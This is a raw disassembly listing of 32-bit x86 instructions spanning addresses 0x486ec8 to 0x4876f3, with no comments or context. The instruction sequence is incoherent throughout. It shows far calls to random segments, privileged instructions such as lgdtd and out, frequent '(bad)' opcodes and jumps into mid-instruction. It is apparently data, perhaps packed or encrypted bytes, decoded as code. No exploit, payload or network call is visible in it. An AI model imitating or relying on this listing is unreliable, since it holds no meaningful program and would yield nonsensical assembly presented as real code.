  486ec8:	lock pushf 
  486eca:	push   esp
  486ecb:	call   0x808:0xec0c0c93
  486ed2:	es mov edi,0x5ce8d328
  486ed8:	fidivr DWORD PTR [esi-0x17]
  486edb:	xchg   BYTE PTR [ebx+0x9d0d502],bl
  486ee1:	fcom   QWORD PTR [ebp-0x33ad5ab6]
  486ee7:	fmul   st,st(0)
  486ee9:	aam    0xc4
  486eeb:	dec    ecx
  486eec:	or     DWORD PTR [edx+0x3ec29d05],esp
  486ef2:	ins    DWORD PTR es:[edi],dx
  486ef3:	shr    BYTE PTR [ebx+ecx*2-0x15],0x1
  486ef8:	and    DWORD PTR [esi+0x62],eax
  486efb:	jbe    0x486e9d
  486efd:	stos   BYTE PTR es:[edi],al
  486efe:	cmp    DWORD PTR [eax-0x77],edx
  486f01:	dec    edi
  486f02:	push   ecx
  486f03:	daa    
  486f04:	bsr    eax,DWORD PTR [ecx]
  486f07:	mov    bl,0xb3
  486f09:	inc    ecx
  486f0a:	xor    eax,0xa0bc52d5
  486f0f:	mov    ah,0xb8
  486f11:	jo     0x486f56
  486f13:	fsub   st,st(2)
  486f15:	jmp    0xa808:0x4906a95
  486f1c:	outs   dx,BYTE PTR ds:[esi]
  486f1d:	push   ecx
  486f1e:	adc    BYTE PTR [esi],dl
  486f20:	push   0x61
  486f22:	std    
  486f23:	xchg   DWORD PTR [ecx],esp
  486f25:	pop    eax
  486f26:	or     bl,ch
  486f28:	push   ebp
  486f29:	mov    BYTE PTR [ebp-0x7f],0x6f
  486f2d:	adc    eax,0xa530e57
  486f32:	add    al,0x4d
  486f34:	cmp    BYTE PTR [ecx+0x22],ah
  486f37:	add    eax,0xdc9a7eec
  486f3c:	out    0xb1,eax
  486f3e:	jp     0x486f2c
  486f40:	jle    0x486fb7
  486f42:	xor    BYTE PTR ds:0xd301c064,bh
  486f48:	pusha  
  486f49:	or     bl,BYTE PTR [eax-0x2cbab9f1]
  486f4f:	scas   al,BYTE PTR es:[edi]
  486f50:	and    BYTE PTR [ebp+0x28c01c22],ah
  486f56:	mov    esp,0x48d9d055
  486f5b:	sbb    eax,DWORD PTR [ebx]
  486f5d:	shr    BYTE PTR [esi],cl
  486f5f:	inc    esi
  486f60:	jmp    0x486f50
  486f62:	fst    DWORD PTR [ebx-0x44]
  486f65:	or     bl,BYTE PTR [esi+0x0]
  486f68:	clc    
  486f69:	or     al,BYTE PTR [ebx]
  486f6b:	rcl    DWORD PTR [edx],cl
  486f6d:	add    al,0xfe
  486f6f:	(bad)  
  486f70:	shl    BYTE PTR [esi+0x4d4622c7],cl
  486f76:	mov    al,0xce
  486f78:	dec    ebx
  486f79:	mov    al,0xca
  486f7b:	inc    edi
  486f7c:	sub    ch,bh
  486f7e:	enter  0xf0e5,0xf0
  486f82:	cs mov al,0xc6
  486f85:	mov    eax,0x6db66955
  486f8a:	sbb    dh,dl
  486f8c:	push   ebp
  486f8d:	push   ebx
  486f8e:	dec    esp
  486f8f:	or     bh,BYTE PTR [eax-0x4bd7fb77]
  486f95:	inc    eax
  486f96:	mov    bh,0x7b
  486f98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  486f99:	pop    ss
  486f9a:	add    edx,DWORD PTR [ebp-0x4c]
  486f9d:	sub    BYTE PTR cs:[ebx+ebp*8-0x766d58fa],dh
  486fa5:	int    0xc7
  486fa7:	mov    esi,0xb726b355
  486fac:	mov    ch,0xb0
  486fae:	jno    0x487020
  486fb0:	pop    eax
  486fb1:	jmp    0x487012
  486fb3:	inc    ebp
  486fb4:	inc    ebx
  486fb5:	adc    bh,BYTE PTR [eax+0x18377415]
  486fbb:	sar    BYTE PTR [ebp+0x1a],0x13
  486fbf:	dec    ebp
  486fc0:	dec    esp
  486fc1:	or     ah,BYTE PTR [ebx]
  486fc3:	loopne 0x48702e
  486fc5:	cmovl  esi,DWORD PTR [edi+0x6f891316]
  486fcc:	das    
  486fcd:	cs or  al,0x53
  486fd0:	call   0x5212:0x6ebc51a9
  486fd7:	mov    esp,0xe60a7723
  486fdc:	sti    
  486fdd:	fdivr  QWORD PTR [esi+0x13]
  486fe0:	adc    ecx,DWORD PTR [ecx+0x148530a]
  486fe6:	sbb    cl,dl
  486fe8:	mov    cl,0xdb
  486fea:	push   ebp
  486feb:	rol    BYTE PTR [esp+ecx*8],1
  486fee:	dec    eax
  486fef:	sub    al,0xcf
  486ff1:	mov    eax,0x2cfbb83b
  486ff6:	inc    ecx
  486ff7:	mov    eax,0x105412ce
  486ffc:	and    esi,esi
  486ffe:	shl    BYTE PTR [edi+esi*2-0x28],0xce
  487003:	adc    ecx,DWORD PTR [ecx-0x60d1d089]
  487009:	jmp    0x48707c
  48700b:	xchg   ebp,eax
  48700c:	or     BYTE PTR [esi+ecx*8+0x2353b417],dh
  487013:	aam    0x53
  487015:	cld    
  487016:	dec    esp
  487017:	ja     0x486fe7
  487019:	adc    ecx,DWORD PTR [ecx+0x14c43ce]
  48701f:	repnz add al,0xa
  487022:	mov    ds:0xffc462a2,eax
  487027:	mov    esi,0xc41d784f
  48702c:	pushf  
  48702d:	or     al,0xa0
  48702f:	imul   edi,DWORD PTR [eax+eiz*8+0x18],0x50fb1a48
  487037:	jb     0x487085
  487039:	xor    al,0x2
  48703b:	jle    0x487048
  48703d:	sbb    DWORD PTR [edx+0x39],eax
  487040:	call   0xed20:0xdc3a5a66
  487047:	ins    DWORD PTR es:[edi],dx
  487048:	xchg   ecx,eax
  487049:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48704a:	cmp    eax,0xcc4adc66
  48704f:	or     al,0x19
  487051:	push   ss
  487052:	imul   ebx,edx,0x87d84bd7
  487058:	fdivr  DWORD PTR [edx]
  48705a:	enter  0x19f8,0xd3
  48705e:	dec    esi
  48705f:	fld    QWORD PTR cs:[edi+0x4ad408d4]
  487066:	les    eax,FWORD PTR [edx]
  487068:	add    al,0xb6
  48706a:	dec    eax
  48706b:	or     BYTE PTR [ecx],bl
  48706d:	xor    dh,BYTE PTR [ecx]
  48706f:	sub    eax,0x54e151a6
  487074:	lgdtd  [esi]
  487077:	jb     0x48709a
  487079:	pop    ss
  48707a:	add    DWORD PTR [ecx],eax
  48707c:	mov    al,0x1
  48707e:	xor    eax,eax
  487080:	push   ds
  487081:	mov    bh,0xb8
  487083:	mov    cl,0xb6
  487085:	adc    BYTE PTR [ecx],ch
  487087:	cmp    BYTE PTR [esi+0x5],0x3d
  48708b:	ficom  DWORD PTR [edi-0x6c]
  48708e:	pop    es
  48708f:	add    ebp,DWORD PTR [ebx+0x14]
  487092:	and    eax,0x2147b00c
  487097:	mov    eax,ds:0x1b4f2f74
  48709c:	(bad)  
  48709e:	mov    edx,0x27173c90
  4870a3:	mov    edi,0x129e0158
  4870a8:	push   ds
  4870a9:	loopne 0x4870f8
  4870ab:	(bad)  
  4870ac:	pop    ecx
  4870ad:	adc    eax,0x3f424325
  4870b2:	enter  0xed08,0x45
  4870b6:	lods   eax,DWORD PTR ds:[esi]
  4870b7:	fistp  WORD PTR ds:0x3133855c
  4870bd:	xchg   edi,eax
  4870be:	imul   eax,DWORD PTR [esi-0x6d],0x7d
  4870c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4870c3:	dec    eax
  4870c4:	pop    ss
  4870c5:	and    BYTE PTR ds:0xb1c87014,dl
  4870cb:	sbb    al,BYTE PTR [ecx]
  4870cd:	int3   
  4870ce:	bound  ecx,QWORD PTR [edx-0x2dd4fe0d]
  4870d4:	ss inc eax
  4870d6:	pop    ds
  4870d7:	jnp    0x4870ab
  4870d9:	pop    ebx
  4870da:	add    eax,0x94a98f18
  4870df:	cmp    ah,BYTE PTR [ebx]
  4870e1:	pop    ebx
  4870e2:	adc    cl,al
  4870e4:	cmp    DWORD PTR [esi+ecx*2-0x7c89713e],ecx
  4870eb:	fcomp  DWORD PTR [ecx]
  4870ed:	mov    dh,0x59
  4870ef:	jmp    0x15af:0xc81b6c1c
  4870f6:	xlat   BYTE PTR ds:[ebx]
  4870f7:	inc    edx
  4870f8:	sub    eax,0xa34379c0
  4870fd:	sbb    DWORD PTR [ecx],0x8
  487100:	mov    dl,0xd7
  487102:	adc    BYTE PTR [ecx+0x15],0x56
  487106:	rol    edx,cl
  487108:	jns    0x487150
  48710a:	dec    ebp
  48710b:	sbb    DWORD PTR [edi-0x1b],eax
  48710e:	mov    ds:0x4e545186,al
  487113:	mov    cs,WORD PTR [edx-0x751fd23f]
  487119:	push   edx
  48711a:	xor    ecx,DWORD PTR [eax+0x78]
  48711d:	fld    st(2)
  48711f:	sbb    eax,0xc87d2b60
  487124:	outs   dx,BYTE PTR ds:[esi]
  487125:	shl    BYTE PTR [edi*2-0xff4cbf5],1
  48712c:	fmul   st(4),st
  48712e:	(bad)  
  48712f:	popf   
  487130:	add    eax,0xc6afe0c
  487135:	adc    eax,0xc98d3bf5
  48713a:	sub    ecx,DWORD PTR [ebp+0x1a]
  48713d:	inc    eax
  48713e:	sub    edx,edi
  487140:	in     eax,0x5a
  487142:	xor    al,BYTE PTR [ebx]
  487144:	jbe    0x487145
  487146:	loop   0x4871a2
  487148:	xor    al,0x1b
  48714a:	and    DWORD PTR [edi+0x1e80dee7],eax
  487150:	lock push eax
  487152:	call   0xfd49:0xc2d0a016
  487159:	aaa    
  48715a:	adc    al,0xd0
  48715c:	push   0xffffffba
  48715e:	mov    al,ah
  487160:	fsubr  DWORD PTR [edx-0x4e1291da]
  487166:	and    DWORD PTR [eax+0x41],eax
  487169:	dec    eax
  48716a:	or     dl,al
  48716c:	mov    esi,0x86c12bc8
  487171:	sub    edi,DWORD PTR [eax+0x1a60ec1]
  487177:	cmp    dl,0x58
  48717a:	adc    eax,0xf96ce97
  48717f:	lods   al,BYTE PTR ds:[esi]
  487180:	inc    ecx
  487181:	push   edx
  487182:	clc    
  487183:	xchg   ecx,eax
  487184:	sub    al,0x3
  487186:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  487187:	cmp    DWORD PTR [ecx+ebp*8+0x4cdce485],esp
  48718e:	aam    0x65
  487190:	dec    edx
  487191:	sub    dl,BYTE PTR [ebp-0xbfd0b34]
  487197:	or     ch,BYTE PTR [ecx+0x5e8a4504]
  48719d:	sub    DWORD PTR [ebp-0x2fd0ffe1],ecx
  4871a3:	mov    dl,0x39
  4871a5:	cmp    cl,BYTE PTR [eax+0x48da5463]
  4871ab:	jle    0x4871a5
  4871ad:	xor    DWORD PTR [eax+0x64386388],ecx
  4871b3:	adc    al,0x4a
  4871b5:	or     DWORD PTR [ebx-0x2e],edx
  4871b8:	fs nop
  4871ba:	inc    DWORD PTR [eax+ebx*1]
  4871bd:	push   esi
  4871be:	(bad)  
  4871bf:	add    ebp,DWORD PTR [ebp+0x52422b2c]
  4871c5:	fstp   QWORD PTR [esi]
  4871c7:	dec    ecx
  4871c8:	push   0xeb55ad6a
  4871cd:	pop    edx
  4871ce:	inc    ebp
  4871cf:	sub    DWORD PTR [ecx],edi
  4871d1:	jnp    0x4871ba
  4871d3:	gs fwait
  4871d5:	nop
  4871d6:	gs scas eax,DWORD PTR es:[edi]
  4871d8:	mov    ah,0x2
  4871da:	xor    eax,DWORD PTR [eax+0x274ca4d9]
  4871e0:	les    ecx,FWORD PTR [edx]
  4871e2:	shr    BYTE PTR [edx+ecx*2-0x26],0x7c
  4871e7:	pop    edi
  4871e8:	inc    eax
  4871e9:	xchg   ebx,eax
  4871ea:	adc    edx,ebx
  4871ec:	(bad)  
  4871ed:	push   edi
  4871ee:	mov    ds:0x39332a29,al
  4871f3:	gs push ecx
  4871f5:	or     al,0x14
  4871f7:	arpl   WORD PTR [ecx+0x56],bp
  4871fa:	(bad)  
  4871fb:	outs   dx,DWORD PTR ds:[esi]
  4871fc:	mov    DWORD PTR [ebx],eax
  4871fe:	repz sbb al,0x64
  487201:	dec    eax
  487202:	loope  0x4871e4
  487204:	add    DWORD PTR [ebx+0x3329f6f7],ecx
  48720a:	test   BYTE PTR [edi-0x55],ah
  48720d:	fadd   DWORD PTR [ecx]
  48720f:	push   es
  487210:	adc    eax,0x42037402
  487215:	cmp    BYTE PTR [ebx],ah
  487217:	aaa    
  487218:	xor    edx,DWORD PTR [edi]
  48721a:	add    al,0x29
  48721c:	inc    esi
  48721d:	or     BYTE PTR [eax],cl
  48721f:	in     al,0xa5
  487221:	mov    al,0x1
  487223:	dec    edi
  487224:	inc    edi
  487225:	les    edx,FWORD PTR [ebp-0x7b6f5cb1]
  48722b:	gs jne 0x48723e
  48722e:	ins    BYTE PTR es:[edi],dx
  48722f:	retf   0xda99
  487232:	sbb    DWORD PTR [ebx+0x5cc94286],esp
  487238:	add    al,0x56
  48723a:	dec    eax
  48723b:	pop    ebp
  48723c:	xchg   ebp,eax
  48723d:	mov    eax,ds:0xfee4ea6b
  487242:	test   BYTE PTR [ebp-0x4a4f8f0d],cl
  487248:	push   edx
  487249:	outs   dx,DWORD PTR ds:[esi]
  48724a:	imul   BYTE PTR [ecx-0x28]
  48724d:	ins    DWORD PTR es:[edi],dx
  48724e:	dec    ebp
  48724f:	leave  
  487250:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  487251:	retf   0xd8d4
  487254:	sbb    eax,0x2d9d258d
  487259:	aam    0x76
  48725b:	xchg   ecx,eax
  48725c:	cli    
  48725d:	inc    edx
  48725e:	dec    esp
  48725f:	sbb    esi,DWORD PTR [ebp-0xe52940c]
  487265:	jae    0x48723a
  487267:	jne    0x48723d
  487269:	lea    edi,[ebp-0x3c]
  48726c:	push   eax
  48726d:	pop    es
  48726e:	call   0x606d:0x6c4ed876
  487275:	cmp    ah,ah
  487277:	aam    0xd7
  487279:	and    BYTE PTR [esi],dl
  48727b:	dec    esp
  48727c:	xchg   ebp,eax
  48727d:	xor    eax,0xde19bf3b
  487282:	xor    ebx,ebx
  487284:	and    ecx,DWORD PTR [ecx-0x67fce9f7]
  48728a:	push   0x2d491829
  48728f:	in     al,0x64
  487291:	aad    0x74
  487293:	js     0x487300
  487295:	mov    cl,0x44
  487297:	cs jnp 0x48729b
  48729a:	xor    BYTE PTR [ecx-0x2ba204e4],ch
  4872a0:	sbb    eax,0xc84bd802
  4872a5:	lods   eax,DWORD PTR ds:[esi]
  4872a6:	dec    edi
  4872a8:	add    DWORD PTR [ebp-0x24],ebx
  4872ab:	test   esi,0xcd13d67e
  4872b1:	fs jmp 0x9201:0x33eca114
  4872b9:	dec    ecx
  4872ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4872bb:	push   edx
  4872bc:	test   eax,0x10e0081c
  4872c1:	adc    eax,0xba1a5dd5
  4872c6:	loopne 0x4872d5
  4872c8:	dec    edx
  4872c9:	ror    BYTE PTR [ebp+0x12bc190d],cl
  4872cf:	xchg   edx,eax
  4872d0:	add    eax,0x4e66467b
  4872d6:	sbb    ah,BYTE PTR [ecx]
  4872d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4872d9:	inc    eax
  4872da:	or     eax,0x665763c8
  4872df:	xor    dh,0x63
  4872e2:	arpl   WORD PTR [eax*4+0x441c4f10],ax
  4872e9:	pushf  
  4872ea:	xchg   ecx,eax
  4872eb:	and    BYTE PTR fs:[edi+0x78],dh
  4872ef:	mov    al,ds:0x597f1b80
  4872f4:	in     eax,0x70
  4872f6:	fisubr DWORD PTR [edx]
  4872f8:	or     ah,BYTE PTR [ebx+0x31]
  4872fb:	push   edi
  4872fc:	nop
  4872fd:	xchg   ebx,eax
  4872fe:	mov    DWORD PTR [edx-0x2e],esp
  487301:	je     0x4872c7
  487303:	and    esp,edx
  487305:	mov    ch,0x54
  487307:	adc    ecx,DWORD PTR [esi]
  487309:	fstp   TBYTE PTR [ecx-0x59]
  48730c:	xor    eax,0x70c61439
  487311:	xchg   ecx,eax
  487312:	add    eax,0xaad69a85
  487317:	and    al,0xbd
  487319:	add    DWORD PTR [ebx],eax
  48731b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48731c:	mov    ds,WORD PTR [ecx-0x10]
  48731f:	aas    
  487320:	sbb    BYTE PTR [esi],al
  487322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  487323:	xlat   BYTE PTR ds:[ebx]
  487324:	rol    BYTE PTR [ebp+0x2d0f9652],1
  48732a:	data16 test BYTE PTR [eax],ah
  48732d:	push   eax
  48732e:	dec    ecx
  48732f:	clc    
  487330:	adc    cl,BYTE PTR [ecx-0x40]
  487333:	xchg   edi,eax
  487334:	lidtd  [ecx+0x4895c94c]
  48733b:	enter  0x501c,0x54
  48733f:	xchg   DWORD PTR [ebx+0x5d],eax
  487342:	add    ch,BYTE PTR [ebx+0x15523113]
  487348:	add    DWORD PTR [eax+0x852c257],0x5d4c007b
  487352:	add    BYTE PTR [ebp-0x6a6a38b7],bh
  487358:	pop    ds
  487359:	or     DWORD PTR [eax+0x44a70152],ebp
  48735f:	dec    edi
  487360:	mov    al,0x0
  487362:	inc    edi
  487363:	jno    0x4873b6
  487365:	loop   0x487355
  487367:	or     DWORD PTR [edx],esi
  487369:	or     ebx,DWORD PTR [edx+0x28f7e84b]
  48736f:	add    esi,0xffffffed
  487372:	adc    BYTE PTR [ebx+esi*2],al
  487375:	cmp    al,0xd4
  487377:	add    DWORD PTR [edx],eax
  487379:	and    ebp,ebx
  48737b:	test   BYTE PTR [eax+eax*2+0x1d],dl
  48737f:	cmp    eax,0x939f0802
  487384:	or     bh,dh
  487386:	cmp    DWORD PTR [edx+0xc],0x1
  48738a:	js     0x48738e
  48738c:	adc    BYTE PTR ds:0x7d384248,dl
  487392:	adc    dh,BYTE PTR [esi-0x390085ce]
  487398:	out    dx,eax
  487399:	jmp    0x4873ab
  48739b:	rcr    BYTE PTR [ecx+0x63],cl
  48739e:	popa   
  48739f:	and    edx,DWORD PTR [ecx]
  4873a1:	dec    esi
  4873a2:	in     al,0xe3
  4873a4:	xchg   BYTE PTR [eax+esi*4],dh
  4873a7:	pop    es
  4873a8:	add    esi,DWORD PTR [esi+0x3c]
  4873ab:	(bad)  
  4873ad:	nop
  4873ae:	jle    0x4873bd
  4873b0:	mov    eax,ds:0xe9438684
  4873b5:	jmp    0x4873d0
  4873b7:	ffree  st(0)
  4873b9:	outs   dx,BYTE PTR ds:[esi]
  4873ba:	dec    eax
  4873bb:	and    DWORD PTR ds:0x80a53116,edx
  4873c1:	add    DWORD PTR [ebx+ecx*1],0x0
  4873c5:	pushf  
  4873c6:	push   0xc260ed47
  4873cb:	cwde   
  4873cc:	mov    ebp,0x9f3c27a8
  4873d1:	inc    edx
  4873d2:	(bad)  
  4873d3:	or     al,0x60
  4873d5:	cmp    eax,DWORD PTR [ebx-0x6f70f5be]
  4873db:	call   0xbd4cd31c
  4873e0:	dec    edx
  4873e1:	inc    ecx
  4873e2:	lahf   
  4873e3:	cmp    esi,DWORD PTR ds:0xf082ef70
  4873e9:	fs jne 0x487465
  4873ec:	mov    eax,DWORD PTR [esi+0x35adae8f]
  4873f2:	mov    ebx,DWORD PTR [ebx+0x5b]
  4873f5:	add    DWORD PTR [ecx-0x5f18fb36],ebp
  4873fb:	or     eax,0x53695840
  487400:	test   BYTE PTR [esi+0x2b780b2e],cl
  487406:	jne    0x487481
  487408:	aaa    
  487409:	scas   eax,DWORD PTR es:[edi]
  48740a:	mov    DWORD PTR ds:0x4387bff9,esi
  487410:	add    BYTE PTR ds:0x481e04cc,bh
  487416:	dec    ecx
  487417:	sub    bl,BYTE PTR [edi+ebx*4+0x2bbb188c]
  48741e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48741f:	jno    0x4873c4
  487421:	cmp    ah,BYTE PTR [edi-0x58]
  487424:	xor    al,0x84
  487426:	daa    
  487427:	call   0x5a5e6b97
  48742c:	or     BYTE PTR [esi+eax*8+0x49],ch
  487430:	jns    0x48747c
  487432:	push   edi
  487433:	test   cl,al
  487435:	jmp    0x2629:0x59a1ffcd
  48743c:	xchg   edi,eax
  48743d:	rol    BYTE PTR [eax-0x3fb53fdc],cl
  487443:	adc    ax,0x3528
  487447:	xchg   edx,eax
  487448:	inc    edx
  487449:	add    esp,ebx
  48744b:	xchg   BYTE PTR [esi+0x26],cl
  48744e:	pop    esi
  48744f:	cwde   
  487450:	and    edx,DWORD PTR ds:0x24ae86e4
  487456:	sbb    esi,ebx
  487458:	rcr    DWORD PTR [esi-0x1c],1
  48745b:	push   es
  48745c:	xchg   ebp,eax
  48745d:	addr16 mov edi,0x3ee8324d
  487463:	xlat   BYTE PTR ds:[ebx]
  487464:	ja     0x487406
  487466:	push   ecx
  487467:	add    BYTE PTR [eax-0x6ddbb47f],0x10
  48746e:	cmp    eax,0xd76b91a8
  487473:	push   ss
  487474:	sub    DWORD PTR [eax+ecx*1],ebp
  487477:	leave  
  487478:	sub    ch,BYTE PTR [eax-0x565ed1]
  48747e:	call   0xadd9:0x235084b3
  487485:	xchg   edx,eax
  487486:	push   ebx
  487487:	add    BYTE PTR [edx],al
  487489:	xchg   edx,eax
  48748a:	push   edx
  48748b:	mov    eax,0x18ccd331
  487490:	cmc    
  487491:	shl    BYTE PTR [ecx],0x86
  487494:	je     0x487495
  487496:	adc    ah,ah
  487498:	ret    
  487499:	sub    BYTE PTR [edx],dh
  48749b:	cmp    DWORD PTR [eax+0x1b1588fe],edi
  4874a1:	pop    edx
  4874a2:	xor    eax,0x902ca595
  4874a7:	dec    edx
  4874a8:	stos   DWORD PTR es:[edi],eax
  4874a9:	dec    DWORD PTR [ecx-0x2578f408]
  4874af:	sub    al,0xe7
  4874b1:	pop    es
  4874b2:	sub    cl,ah
  4874b4:	jle    0x4874a0
  4874b6:	(bad)  
  4874b7:	in     al,dx
  4874b8:	cmp    DWORD PTR [ebp-0x39a07e94],esp
  4874be:	or     BYTE PTR [ecx-0x3cf37cdb],cl
  4874c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4874c5:	ss push 0x6
  4874c8:	hlt    
  4874c9:	add    al,BYTE PTR [ebp+0x281e2080]
  4874cf:	mov    ebp,0x4bcf1850
  4874d4:	add    bh,dh
  4874d6:	sbb    bh,ah
  4874d8:	mov    esp,0x4300b758
  4874dd:	jmp    0x487540
  4874df:	or     eax,0xfa501410
  4874e4:	je     0x487467
  4874e6:	test   BYTE PTR [ebx-0x3a],dl
  4874e9:	stos   BYTE PTR es:[edi],al
  4874ea:	jnp    0x4874d8
  4874ec:	sbb    eax,0xad94af20
  4874f1:	or     BYTE PTR [edx],al
  4874f3:	lods   al,BYTE PTR ds:[esi]
  4874f4:	popa   
  4874f5:	push   ebp
  4874f6:	ret    0xf2c4
  4874f9:	mov    cl,0x79
  4874fb:	dec    esp
  4874fc:	loopne 0x487525
  4874fe:	test   DWORD PTR [edx+0x4],0x86db070b
  487505:	rcr    DWORD PTR [eax+0x76],cl
  487508:	dec    esi
  487509:	and    ah,BYTE PTR [ebp+0xc34099d]
  48750f:	mov    al,0xb2
  487511:	push   cs
  487512:	add    DWORD PTR [esi+0x3b7dd3ca],ebx
  487518:	cmp    DWORD PTR [edx+0x4],0x17321116
  48751f:	sub    DWORD PTR [ecx],edx
  487521:	or     BYTE PTR [ecx-0x7c],0xb7
  487525:	aaa    
  487526:	sahf   
  487527:	mov    esi,0x9bc0fb4a
  48752c:	jbe    0x487536
  48752e:	push   cs
  48752f:	or     cl,BYTE PTR ds:0xf00a036
  487535:	imul   eax,DWORD PTR ds:0xf023ad06,0xbf2d351a
  48753f:	sub    al,0xd2
  487541:	mov    ecx,0xabcfec86
  487546:	mov    al,BYTE PTR [ecx]
  487548:	cmp    BYTE PTR [esi+0x1d80911],0xa9
  48754f:	jne    0x487599
  487551:	mov    eax,ds:0xa0638713
  487556:	clc    
  487557:	mov    eax,ds:0x34e4e4c9
  48755c:	je     0x4875a6
  48755e:	cli    
  48755f:	push   es
  487560:	imul   eax,DWORD PTR [edi-0x36fb75a3],0xca4712
  48756a:	sbb    al,0x2
  48756c:	inc    esi
  48756d:	sub    al,BYTE PTR [eax+eax*2]
  487570:	stc    
  487571:	popa   
  487572:	popa   
  487573:	add    bh,BYTE PTR [ecx]
  487575:	mov    dl,0x8a
  487577:	pop    esi
  487578:	and    eax,0xb79ac431
  48757d:	push   0x53
  48757f:	and    DWORD PTR [ebp-0xc],ebx
  487582:	cmp    BYTE PTR [ebx+0x2b353bd9],cl
  487588:	and    al,BYTE PTR [eax]
  48758a:	dec    edi
  48758b:	push   cs
  48758c:	dec    edx
  48758d:	adc    BYTE PTR [ecx+0x487a018c],dl
  487593:	pop    ss
  487594:	das    
  487595:	cld    
  487596:	nop
  487597:	add    BYTE PTR [esp+ecx*2],0xf5
  48759b:	adc    esi,ebp
  48759d:	dec    edx
  48759e:	ret    
  48759f:	mov    eax,0x48d00462
  4875a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4875a5:	mov    ebp,0x34ba7e2
  4875aa:	dec    esi
  4875ab:	cmp    eax,edx
  4875ad:	jge    0x4875bf
  4875af:	daa    
  4875b0:	data16 sub cl,BYTE PTR [ecx]
  4875b3:	add    eax,0x54473604
  4875b8:	mov    ecx,0x485cd24c
  4875bd:	call   0xdbabbe16
  4875c2:	jbe    0x487568
  4875c4:	call   0x7e5ab105
  4875c9:	or     dl,BYTE PTR [edi]
  4875cb:	sub    edx,esi
  4875cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4875ce:	dec    ebp
  4875cf:	call   0x106a:0x8916f430
  4875d6:	pop    ss
  4875d7:	mov    gs,WORD PTR [ebp+0x4d508dd7]
  4875dd:	test   eax,0x63d10703
  4875e2:	push   eax
  4875e3:	dec    ecx
  4875e4:	mov    eax,0x58773e21
  4875e9:	mov    gs,WORD PTR [ecx+0x3d14822b]
  4875ef:	cli    
  4875f0:	out    dx,eax
  4875f1:	and    DWORD PTR [esi],0xffffffc6
  4875f4:	xchg   esi,eax
  4875f5:	ins    BYTE PTR es:[edi],dx
  4875f6:	cli    
  4875f7:	push   ebp
  4875f8:	adc    BYTE PTR [ebx+eax*8-0x7c858222],dl
  4875ff:	cmp    eax,0x437f6a40
  487604:	push   eax
  487605:	je     0x48758e
  487607:	jno    0x48765d
  487609:	pop    ecx
  48760a:	push   0x53805816
  48760f:	inc    ecx
  487610:	sar    BYTE PTR [edi+0x60],cl
  487613:	and    bh,al
  487615:	ds push edi
  487617:	pop    ecx
  487618:	das    
  487619:	sbb    BYTE PTR [eax+0x14],ah
  48761c:	lock and dh,dh
  48761f:	sbb    ebp,DWORD PTR [esi-0x6a]
  487622:	adc    BYTE PTR [edi+0x20],ch
  487625:	push   ebp
  487626:	lods   eax,DWORD PTR ds:[esi]
  487627:	pop    eax
  487628:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  487629:	adc    al,0x12
  48762b:	sbb    ecx,ebp
  48762d:	bound  edi,QWORD PTR [esi+0x6d]
  487630:	mov    al,0x42
  487632:	adc    eax,0x487c1ac6
  487637:	stos   BYTE PTR es:[edi],al
  487638:	mov    eax,0x4c2c1487
  48763d:	cmp    ah,BYTE PTR [edi+edi*8+0x15]
  487641:	out    0xcf,eax
  487643:	pusha  
  487644:	pop    ebp
  487645:	sub    eax,0x3be550bb
  48764a:	nop
  48764b:	push   0xb
  48764d:	cmp    BYTE PTR [edx+eax*4],cl
  487650:	add    al,0x81
  487652:	leave  
  487653:	fld    DWORD PTR [esi-0x4af5c340]
  487659:	cwde   
  48765a:	mov    WORD PTR [ebx-0x5c7f5f77],gs
  487660:	pop    eax
  487661:	popa   
  487662:	add    BYTE PTR [edx+0x32],dh
  487665:	inc    ebp
  487666:	and    ch,BYTE PTR [ecx-0x31]
  487669:	lock lock add ebx,esi
  48766d:	lea    edx,[ebp+0x42d01212]
  487673:	ror    BYTE PTR [eax-0x5b],0x7
  487677:	lahf   
  487678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  487679:	hlt    
  48767a:	test   BYTE PTR gs:[edx],cl
  48767d:	iret   
  48767e:	xchg   bh,ah
  487680:	stos   BYTE PTR es:[edi],al
  487681:	and    ebp,ebp
  487683:	(bad)  
  487684:	sbb    eax,0x1c5530c
  487689:	cs in  al,0xd5
  48768c:	add    eax,DWORD PTR [esi+0x20d20883]
  487692:	sbb    DWORD PTR [ebx+0x6],ebx
  487695:	push   es
  487696:	or     al,0x2
  487698:	daa    
  487699:	inc    edi
  48769a:	dec    eax
  48769b:	cmp    DWORD PTR [edx-0x50bc1b7a],esp
  4876a1:	or     esp,DWORD PTR [ebx-0x33]
  4876a4:	add    al,0x48
  4876a6:	mov    ch,0x63
  4876a8:	jne    0x4876bb
  4876aa:	mov    edi,0x6ac094a0
  4876af:	cmpxchg DWORD PTR [edi],esp
  4876b2:	jmp    0x4876a0
  4876b4:	out    0x2e,al
  4876b6:	mov    esp,0x10063d27
  4876bb:	mov    dl,0x1
  4876bd:	inc    esi
  4876be:	xor    al,0x54
  4876c0:	ds cmp bl,dl
  4876c3:	sbb    dh,dh
  4876c5:	inc    esi
  4876c6:	add    BYTE PTR ds:0xa444f120,ch
  4876cc:	dec    ecx
  4876cd:	test   al,0x4
  4876cf:	fcomp  DWORD PTR [edi+ebp*8]
  4876d2:	cmp    esp,DWORD PTR [ecx+edx*1-0x7a2443fc]
  4876d9:	add    BYTE PTR [esi-0x4667bb3e],cl
  4876df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4876e0:	push   es
  4876e1:	pop    edx
  4876e2:	jmp    0x4876f2
  4876e4:	pop    ss
  4876e5:	call   0x5a6eecdd
  4876ea:	or     al,0x56
  4876ec:	xor    al,ch
  4876ee:	mov    ecx,0xde244753
  4876f3:	add    al,0x6b
